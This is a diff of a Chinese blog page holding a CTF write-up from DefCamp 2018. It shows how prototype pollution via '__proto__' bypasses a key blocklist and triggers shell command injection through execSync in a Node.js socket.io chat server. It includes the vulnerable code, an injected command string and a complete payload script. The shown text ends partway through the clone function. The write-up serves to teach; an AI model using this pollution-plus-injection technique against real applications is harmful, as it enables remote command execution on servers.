@@ -57,7 +57,7 @@
     "datePublished": "2018-09-25 14:50:27 \x2b0000 UTC",
     "dateModified" : "2018-09-25 14:50:27 \x2b0000 UTC",
     "url" : "https:\/\/syang-ng.github.io\/2018\/09\/%E4%BB%8E%E4%B8%80%E9%81%93-ctf-%E9%A2%98%E7%9C%8B-nodejs-%E7%9A%84-prototype-pollution-attack\/",
-    "wordCount" : "2234",
+    "wordCount" : "2230",
     "keywords" : [  "syang\x27s blog"]
 }
 </script>
@@ -145,257 +145,207 @@
           
           
 
-          
-
-<blockquote>
-<p>文章首发于先知社区 <a href="https://xz.aliyun.com/t/2802" rel="nofollow noreferrer" target="_blank">https://xz.aliyun.com/t/2802</a></p>
+          <blockquote>
+<p>文章首发于先知社区 <a href="https://xz.aliyun.com/t/2802">https://xz.aliyun.com/t/2802</a></p>
 </blockquote>
-
 <h2 id="前言">前言</h2>
-
 <p>文章的灵感来自于刚刚结束的 DefCamp CTF 2018 上的一道题目，主要的考点是 Node.js 的 prototype pollution attack。因为在 CTF 中 Node.js 的题型较少，同时本人也恰好对其比较感兴趣，所以特地来分析一下这道题的前因后果。</p>
-
 <h2 id="题目">题目</h2>
-
-<p>题目是一个由 Node.js 编写的基于 socket.io 的聊天应用，运行在 <a href="https://chat.dctfq18.def.camp" rel="nofollow noreferrer" target="_blank">https://chat.dctfq18.def.camp</a> 的 80 端口上，我们可以从 <a href="https://dctf.def.camp/dctf-18-quals-81249812/chat.zip" rel="nofollow noreferrer" target="_blank">https://dctf.def.camp/dctf-18-quals-81249812/chat.zip</a> 下载源码</p>
-
+<p>题目是一个由 Node.js 编写的基于 socket.io 的聊天应用，运行在 <a href="https://chat.dctfq18.def.camp">https://chat.dctfq18.def.camp</a> 的 80 端口上，我们可以从 <a href="https://dctf.def.camp/dctf-18-quals-81249812/chat.zip">https://dctf.def.camp/dctf-18-quals-81249812/chat.zip</a> 下载源码</p>
 <p>客户端的代码非常简单，分析 client.js 我们可以发现其只是向服务端注册用户并发送消息：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">io</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;socket.io-client&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">socket</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#e6db74">&#39;https://chat.dctfq18.def.camp&#39;</span>)
 
-<pre><code class="language-javascript">const io = require('socket.io-client')
-const socket = io.connect('https://chat.dctfq18.def.camp')
-
-if(process.argv.length != 4) {
-  console.log('name and channel missing')
-   process.exit()
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">argv</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span>) {
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;name and channel missing&#39;</span>)
+   <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">exit</span>()
 }
-console.log('Logging as ' + process.argv[2] + ' on ' + process.argv[3])
-var inputUser = {
-  name: process.argv[2],
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Logging as &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">argv</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; on &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">argv</span>[<span style="color:#ae81ff">3</span>])
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">inputUser</span> <span style="color:#f92672">=</span> {
+  <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">argv</span>[<span style="color:#ae81ff">2</span>],
 };
 
-socket.on('message', function(msg) {
-  console.log(msg.from,&quot;[&quot;, msg.channel!==undefined?msg.channel:'Default',&quot;]&quot;, &quot;says:\n&quot;, msg.message);
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">msg</span>) {
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">from</span>,<span style="color:#e6db74">&#34;[&#34;</span>, <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">channel</span><span style="color:#f92672">!==</span><span style="color:#66d9ef">undefined</span><span style="color:#f92672">?</span><span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">channel</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;Default&#39;</span>,<span style="color:#e6db74">&#34;]&#34;</span>, <span style="color:#e6db74">&#34;says:\n&#34;</span>, <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">message</span>);
 });
 
-socket.on('error', function (err) {
-  console.log('received socket error:')
-  console.log(err)
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">err</span>) {
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;received socket error:&#39;</span>)
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">err</span>)
 })
 
-socket.emit('register', JSON.stringify(inputUser));
-socket.emit('message', JSON.stringify({ msg: &quot;hello&quot; }));
-socket.emit('join', process.argv[3]);//ps: you should keep your channels private
-socket.emit('message', JSON.stringify({ channel: process.argv[3], msg: &quot;hello channel&quot; }));
-socket.emit('message', JSON.stringify({ channel: &quot;test&quot;, msg: &quot;i own you&quot; }));
-</code></pre>
-
-<p>所以我们需要继续审计服务端的代码，可以看到 server.js 中存在着很一个敏感的函数 <code>getAscii</code>，在分析了其对应的代码后，可以发现其中存在着一个很明显的命令注入问题：</p>
-
-<pre><code class="language-javascript">getAscii: function(message) {
-    var e = require('child_process');
-    return e.execSync(&quot;cowsay '&quot; + message + &quot;'&quot;).toString();
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;register&#39;</span>, <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">inputUser</span>));
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;hello&#34;</span> }));
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;join&#39;</span>, <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">argv</span>[<span style="color:#ae81ff">3</span>]);<span style="color:#75715e">//ps: you should keep your channels private
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">channel</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">argv</span>[<span style="color:#ae81ff">3</span>], <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;hello channel&#34;</span> }));
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">channel</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;test&#34;</span>, <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;i own you&#34;</span> }));
+</code></pre></div><p>所以我们需要继续审计服务端的代码，可以看到 server.js 中存在着很一个敏感的函数 <code>getAscii</code>，在分析了其对应的代码后，可以发现其中存在着一个很明显的命令注入问题：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">getAscii</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">message</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;child_process&#39;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">execSync</span>(<span style="color:#e6db74">&#34;cowsay &#39;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>).<span style="color:#a6e22e">toString</span>();
 }
-</code></pre>
-
-<p>只要我们构造 <code>message = &quot;aaa';ls -al; echo 'xxx&quot;</code>，服务器就会将命令 <code>cowsay 'aaa'; ls -al; echo 'xxx'</code> 执行后的结果发送给我们。</p>
-
+</code></pre></div><p>只要我们构造 <code>message = &quot;aaa';ls -al; echo 'xxx&quot;</code>，服务器就会将命令 <code>cowsay 'aaa'; ls -al; echo 'xxx'</code> 执行后的结果发送给我们。</p>
 <p>那么我们需要关注的下一个问题则是哪里会调用 <code>getAscii</code> 函数，可以发现服务端会在监听到 join 和 leave 两个事件的时候触发该函数：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;join&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">channel</span>) {
+    <span style="color:#66d9ef">try</span> {
+        <span style="color:#a6e22e">clientManager</span>.<span style="color:#a6e22e">joinChannel</span>(<span style="color:#a6e22e">client</span>, <span style="color:#a6e22e">channel</span>);
+        <span style="color:#a6e22e">sendMessageToClient</span>(<span style="color:#a6e22e">client</span>,<span style="color:#e6db74">&#34;Server&#34;</span>, 
+            <span style="color:#e6db74">&#34;You joined channel&#34;</span>, <span style="color:#a6e22e">channel</span>)
 
-<pre><code class="language-javascript">client.on('join', function(channel) {
-    try {
-        clientManager.joinChannel(client, channel);
-        sendMessageToClient(client,&quot;Server&quot;, 
-            &quot;You joined channel&quot;, channel)
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">clientManager</span>.<span style="color:#a6e22e">getUsername</span>(<span style="color:#a6e22e">client</span>);
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">clientManager</span>.<span style="color:#a6e22e">getCountry</span>(<span style="color:#a6e22e">client</span>);
 
-        var u = clientManager.getUsername(client);
-        var c = clientManager.getCountry(client);
-
-        sendMessageToChannel(channel,&quot;Server&quot;, 
-            helper.getAscii(&quot;User &quot; + u + &quot; living in &quot; + c + &quot; joined channel&quot;))
-    } catch(e) { console.log(e); client.disconnect() }
+        <span style="color:#a6e22e">sendMessageToChannel</span>(<span style="color:#a6e22e">channel</span>,<span style="color:#e6db74">&#34;Server&#34;</span>, 
+            <span style="color:#a6e22e">helper</span>.<span style="color:#a6e22e">getAscii</span>(<span style="color:#e6db74">&#34;User &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">u</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; living in &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; joined channel&#34;</span>))
+    } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) { <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>); <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">disconnect</span>() }
 });
 
-client.on('leave', function(channel) {
-    try {
-        client .join(channel);
-        clientManager.leaveChannel(client, channel);
-        sendMessageToClient(client,&quot;Server&quot;, 
-            &quot;You left channel&quot;, channel)
+<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;leave&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">channel</span>) {
+    <span style="color:#66d9ef">try</span> {
+        <span style="color:#a6e22e">client</span> .<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">channel</span>);
+        <span style="color:#a6e22e">clientManager</span>.<span style="color:#a6e22e">leaveChannel</span>(<span style="color:#a6e22e">client</span>, <span style="color:#a6e22e">channel</span>);
+        <span style="color:#a6e22e">sendMessageToClient</span>(<span style="color:#a6e22e">client</span>,<span style="color:#e6db74">&#34;Server&#34;</span>, 
+            <span style="color:#e6db74">&#34;You left channel&#34;</span>, <span style="color:#a6e22e">channel</span>)
 
-        var u = clientManager.getUsername(client);
-        var c = clientManager.getCountry(client);
-        sendMessageToChannel(channel, &quot;Server&quot;, 
-            helper.getAscii(&quot;User &quot; + u + &quot; living in &quot; + c + &quot; left channel&quot;))
-    } catch(e) { console.log(e); client.disconnect() }
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">u</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">clientManager</span>.<span style="color:#a6e22e">getUsername</span>(<span style="color:#a6e22e">client</span>);
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">clientManager</span>.<span style="color:#a6e22e">getCountry</span>(<span style="color:#a6e22e">client</span>);
+        <span style="color:#a6e22e">sendMessageToChannel</span>(<span style="color:#a6e22e">channel</span>, <span style="color:#e6db74">&#34;Server&#34;</span>, 
+            <span style="color:#a6e22e">helper</span>.<span style="color:#a6e22e">getAscii</span>(<span style="color:#e6db74">&#34;User &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">u</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; living in &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; left channel&#34;</span>))
+    } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) { <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>); <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">disconnect</span>() }
 });
-</code></pre>
-
-<p>所以下一个问题则变成了如何控制变量 <code>u</code> 或 <code>c</code>，即用户输入的 username 和 country，但问题是不是这么简单呢？当然不是，服务端会对用户的输入做非常严格的校验：</p>
-
-<pre><code class="language-javascript">validUser: function(inp) {
-    var block = [&quot;source&quot;,&quot;port&quot;,&quot;font&quot;,&quot;country&quot;,
-                    &quot;location&quot;,&quot;status&quot;,&quot;lastname&quot;];
-    if(typeof inp !== 'object') {
-        return false;
+</code></pre></div><p>所以下一个问题则变成了如何控制变量 <code>u</code> 或 <code>c</code>，即用户输入的 username 和 country，但问题是不是这么简单呢？当然不是，服务端会对用户的输入做非常严格的校验：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">validUser</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">inp</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">block</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;source&#34;</span>,<span style="color:#e6db74">&#34;port&#34;</span>,<span style="color:#e6db74">&#34;font&#34;</span>,<span style="color:#e6db74">&#34;country&#34;</span>,
+                    <span style="color:#e6db74">&#34;location&#34;</span>,<span style="color:#e6db74">&#34;status&#34;</span>,<span style="color:#e6db74">&#34;lastname&#34;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">inp</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;object&#39;</span>) {
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
     } 
 
-    var keys = Object.keys(inp);
-    for(var i = 0; i&lt; keys.length; i++) {
-        key = keys[i];
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">keys</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">inp</span>);
+    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">keys</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">keys</span>[<span style="color:#a6e22e">i</span>];
 
-        if(block.indexOf(key) !== -1) {
-            return false;
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#a6e22e">key</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
         }
     }
 
-    var r =/^[a-z0-9]+$/gi;
-    if(inp.name === undefined || !r.test(inp.name)) {
-        return false;
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span><span style="color:#e6db74">/^[a-z0-9]+$/gi</span>;
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">inp</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">undefined</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">inp</span>.<span style="color:#a6e22e">name</span>)) {
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
     }
 
-    return true;
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
 }
-</code></pre>
-
-<p>可以看到由于正则检查的存在，我们根本无法在 name 属性注入代码，而且由于黑名单的限制，我们也无法直接给 country 属性赋值，那么问题是不是已经陷入僵局了？答案是否定的，天无绝人之路，在这里，我们可以使用 prototype pollution attack 来间接复写 country 属性。</p>
-
-<p>具体操作如下：
-1. 我们通过给对象的 <code>__proto__</code> 属性赋值，构造出 <code>{&quot;name&quot;:&quot;xxx&quot;, &quot;__proto__&quot;:{&quot;country&quot;:&quot;xxx';ls -al;echo 'xxx&quot;}}</code>
-2. 在服务端接收该对象并调用 <code>clone</code> 函数后，攻击生效。此时访问对象的 country 属性，会得到我们注入的 <code>&quot;xxx';ls -al;echo 'xxx&quot;</code>
-3. 服务端执行 <code>getAscii</code> 函数，触发命令注入
-4. 继续改写 payload，成功 get flag</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="https://xzfile.aliyuncs.com/media/upload/picture/20180925142325-824626bc-c08b-1.png" alt="Get Flag" class="lazyload"><figcaption class="image-caption">Get Flag</figcaption></figure></p>
-
+</code></pre></div><p>可以看到由于正则检查的存在，我们根本无法在 name 属性注入代码，而且由于黑名单的限制，我们也无法直接给 country 属性赋值，那么问题是不是已经陷入僵局了？答案是否定的，天无绝人之路，在这里，我们可以使用 prototype pollution attack 来间接复写 country 属性。</p>
+<p>具体操作如下：</p>
+<ol>
+<li>我们通过给对象的 <code>__proto__</code> 属性赋值，构造出 <code>{&quot;name&quot;:&quot;xxx&quot;, &quot;__proto__&quot;:{&quot;country&quot;:&quot;xxx';ls -al;echo 'xxx&quot;}}</code></li>
+<li>在服务端接收该对象并调用 <code>clone</code> 函数后，攻击生效。此时访问对象的 country 属性，会得到我们注入的 <code>&quot;xxx';ls -al;echo 'xxx&quot;</code></li>
+<li>服务端执行 <code>getAscii</code> 函数，触发命令注入</li>
+<li>继续改写 payload，成功 get flag</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180925142325-824626bc-c08b-1.png" alt="Get Flag"></p>
 <h3 id="payload">payload</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">io</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;socket.io-client&#39;</span>)
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">socket</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#e6db74">&#39;https://chat.dctfq18.def.camp&#39;</span>)
 
-<pre><code class="language-javascript">const io = require('socket.io-client')
-const socket = io.connect('https://chat.dctfq18.def.camp')
-
-socket.on('error', function (err) {
-  console.log('received socket error:')
-  console.log(err)
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;error&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">err</span>) {
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;received socket error:&#39;</span>)
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">err</span>)
 })
 
-socket.on('message', function(msg) {
-  console.log(msg.from,&quot;[&quot;, msg.channel!==undefined?msg.channel:'Default',&quot;]&quot;, &quot;says:\n&quot;, msg.message);
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">msg</span>) {
+  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">from</span>,<span style="color:#e6db74">&#34;[&#34;</span>, <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">channel</span><span style="color:#f92672">!==</span><span style="color:#66d9ef">undefined</span><span style="color:#f92672">?</span><span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">channel</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;Default&#39;</span>,<span style="color:#e6db74">&#34;]&#34;</span>, <span style="color:#e6db74">&#34;says:\n&#34;</span>, <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">message</span>);
 });
 
-socket.emit('register', `{&quot;name&quot;:&quot;xxx&quot;, &quot;__proto__&quot;:{&quot;country&quot;:&quot;xxx';ls -al;echo 'xxx&quot;}}`);
-socket.emit('message', JSON.stringify({ msg: &quot;hello&quot; }));
-socket.emit('join', 'xxx');
-</code></pre>
-
-<h2 id="问题分析">问题分析</h2>
-
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;register&#39;</span>, <span style="color:#e6db74">`{&#34;name&#34;:&#34;xxx&#34;, &#34;__proto__&#34;:{&#34;country&#34;:&#34;xxx&#39;;ls -al;echo &#39;xxx&#34;}}`</span>);
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;hello&#34;</span> }));
+<span style="color:#a6e22e">socket</span>.<span style="color:#a6e22e">emit</span>(<span style="color:#e6db74">&#39;join&#39;</span>, <span style="color:#e6db74">&#39;xxx&#39;</span>);
+</code></pre></div><h2 id="问题分析">问题分析</h2>
 <p>本题的解题思路就到此为止了，但题目背后的 prototype pollution attack 还是非常值得我们思考的。以上题为例，我们来分析一下为什么会触发该攻击。</p>
-
 <p>可以看到上题中，在收到客户端的数据后，服务端会先调用 JSON.parse 解析用户输入，然后再调用 clone 函数： <code>newUser = helper.clone(JSON.parse(inUser))</code>，而问题恰好出在 clone 函数上，我们可以编写代码来复现该操作：</p>
-
-<pre><code class="language-javascript">function clone(obj) {
-    if (typeof obj !== 'object' || obj === null) {
-        return obj;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">clone</span>(<span style="color:#a6e22e">obj</span>) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;object&#39;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">obj</span>;
     }
 
-    var newObj;
-    var cloneDeep = false;
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">newObj</span>;
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cloneDeep</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
 
-    if (!Array.isArray(obj)) {
-        if (Buffer.isBuffer(obj)) {
-            newObj = new Buffer(obj);
-        } else if (obj instanceof Date) {
-            newObj = new Date(obj.getTime());
-        } else if (obj instanceof RegExp) {
-            newObj = new RegExp(obj);
-        } else {
-            var proto = Object.getPrototypeOf(obj);
-            if (proto &amp;&amp; proto.isImmutable) {
-                newObj = obj;
-            } else {
-                newObj = Object.create(proto);
-                cloneDeep = true;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Array.<span style="color:#a6e22e">isArray</span>(<span style="color:#a6e22e">obj</span>)) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">isBuffer</span>(<span style="color:#a6e22e">obj</span>)) {
+            <span style="color:#a6e22e">newObj</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Buffer</span>(<span style="color:#a6e22e">obj</span>);
+        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">obj</span> <span style="color:#66d9ef">instanceof</span> Date) {
+            <span style="color:#a6e22e">newObj</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Date(<span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">getTime</span>());
+        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">obj</span> <span style="color:#66d9ef">instanceof</span> RegExp) {
+            <span style="color:#a6e22e">newObj</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RegExp(<span style="color:#a6e22e">obj</span>);
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">proto</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">getPrototypeOf</span>(<span style="color:#a6e22e">obj</span>);
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">proto</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">proto</span>.<span style="color:#a6e22e">isImmutable</span>) {
+                <span style="color:#a6e22e">newObj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>;
+            } <span style="color:#66d9ef">else</span> {
+                <span style="color:#a6e22e">newObj</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">create</span>(<span style="color:#a6e22e">proto</span>);
+                <span style="color:#a6e22e">cloneDeep</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
             }
         }
-    } else {
-        newObj = [];
-        cloneDeep = true;
+    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#a6e22e">newObj</span> <span style="color:#f92672">=</span> [];
+        <span style="color:#a6e22e">cloneDeep</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
     }
 
-    if (cloneDeep) {
-        var keys = Object.getOwnPropertyNames(obj);
-        for (var i = 0; i &lt; keys.length; ++i) {
-            var key = keys[i];
-            var descriptor = Object.getOwnPropertyDescriptor(obj, key);
-            if (descriptor &amp;&amp; (descriptor.get || descriptor.set)) {
-                Object.defineProperty(newObj, key, descriptor);
-            } else {
-                newObj[key] = clone(obj[key]);
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">cloneDeep</span>) {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">keys</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">getOwnPropertyNames</span>(<span style="color:#a6e22e">obj</span>);
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">keys</span>.<span style="color:#a6e22e">length</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span>) {
